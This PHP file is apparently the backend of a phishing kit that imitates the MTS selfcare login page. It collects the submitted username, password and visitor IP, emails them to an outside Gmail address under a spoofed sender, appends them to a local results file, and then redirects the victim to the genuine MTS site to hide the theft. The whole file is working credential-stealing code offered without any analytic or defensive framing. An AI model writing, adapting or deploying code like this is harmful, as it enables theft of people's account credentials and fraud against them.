<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "[----------Login----------]\n";
$message .= "DocuNume     : ".$_POST['username']."\n";
$message .= "Password     : ".$_POST['password']."\n";
$message .= "AdressIP     : ".$ip."\n";
$message .= "[----------Login----------]\n";

$send = "bijigo.sa@gmail.com";
$subject = "mymts[Login] $ip";
$headers = "From: [mymts]<info@mymts.net>";
mail($send,$subject,$message,$headers);

$file = fopen("../rzlt.txt","a");
echo fwrite($file,$message);
fclose($file);

echo '<script language="Javascript">
<!--
document.location.replace("https://selfcare.mtsmail.ca/selfcare/user/profile/qa/");
// -->
</script>';
?>

